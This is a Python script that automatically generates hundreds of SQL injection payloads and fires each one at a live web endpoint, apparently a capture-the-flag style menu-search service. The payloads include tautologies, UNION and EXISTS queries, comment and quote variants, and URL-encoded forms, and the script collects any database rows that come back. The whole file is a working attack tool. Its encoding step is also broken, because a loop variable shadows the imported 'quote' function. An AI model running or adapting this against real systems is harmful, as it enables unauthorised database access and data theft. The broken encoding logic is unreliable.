import requests
from bs4 import BeautifulSoup
import time
from urllib.parse import quote

def send_request(payload):
    url = "https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws/menu"
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0'
    }
    data = {'query': payload}
    return requests.post(url, headers=headers, data=data)

def parse_response(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    results = []
    table = soup.find('table')
    if table:
        rows = table.find_all('tr')[1:]  # Skip header
        for row in rows:
            cols = row.find_all('td')
            if cols:
                result = [col.text.strip() for col in cols]
                results.append(result)
    return results

def test_payload(payload):
    try:
        response = send_request(payload)
        results = parse_response(response)
        return results
    except Exception as e:
        print(f"Error with payload {payload}: {e}")
        return None

def generate_sanitization_bypass_payloads():
    
    test_cases = [
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT NULL--",
    "' OR 1=1;--",
    "')) OR 1=1--",
    "admin'/*",
    "' OR '1'='1'#",
    "' OR 1=1#",
    "' OR 'x'='x",
]
    
    base_conditions = [
        "1=1",
        "true",
        "'a'='a",
        "1 like 1",
        "1 in (1)",
    ]
    
    
    # Different ways to represent spaces
    spaces = [" ", "%20", "\t", "\n", "\r", "\v", "\f", "+"]
    
    # Different comment types
    comments = ["--", "#", "/*", "--+", "-- -"]
    
    # Different quote types
    quotes = ["'", "\"", "`", "´", "''"]
    
    # Generate payloads
    payloads = []
    
    # Basic sanitization bypass attempts
    for condition in base_conditions:
        for space in spaces:
            for comment in comments:
                for quote in quotes:
                    # Basic payload
                    payload = f"{quote}{space}OR{space}{condition}{space}{comment}"
                    payloads.append(payload)
                    
                    # URL encoded version
                    payloads.append(quote(payload))
                    
                    # Double URL encoded version
                    payloads.append(quote(quote(payload)))
    
    # Add specific sanitizer-related payloads
    special_payloads = [
        "' OR dish LIKE '%sanitizer%'--",
        "' OR category LIKE '%sanitizer%'--",
        "' OR dish LIKE '%special%'--",
        "' OR category LIKE '%special%'--",
        "' OR dish IN (SELECT name FROM sanitizer_items)--",
        "' OR 1=1 /* sanitizer bypass */--",
        "admin'-- ",
        "' OR '1'='1",
        "1' OR '1'='1",
        "'/**/OR/**/1=1/**/--",
        "'%20OR%201=1--",
        "'%0aOR%0a1=1--",
        "' AND 1=0 UNION ALL SELECT 'sanitizer',1,'special'--",
        "' OR EXISTS(SELECT * FROM sanitizer_items)--",
        "' OR EXISTS(SELECT * FROM special_menu)--"
    ]
    
    payloads.extend(special_payloads)
    payloads.extend(test_cases)
    return payloads

def main():
    print("Starting SQL injection tests focused on sanitization bypasses...")
    payloads = generate_sanitization_bypass_payloads()
    unique_results = set()
    
    for i, payload in enumerate(payloads, 1):
        print(f"\nTesting payload {i}/{len(payloads)}: {payload}")
        results = test_payload(payload)
        
        if results:
            # Convert results to tuple of tuples for set storage
            results_tuple = tuple(tuple(row) for row in results)
            if results_tuple not in unique_results:
                print("New unique result found!")
                print("Results:", results)
                unique_results.add(results_tuple)
        
        time.sleep(0.5)  # Be nice to the server
    
    print("\nTesting complete!")
    print(f"Found {len(unique_results)} unique result sets")
    
    print("\nAll unique results:")
    for i, result_set in enumerate(unique_results, 1):
        print(f"\nUnique Result Set {i}:")
        for row in result_set:
            print(row)

if __name__ == "__main__":
    main()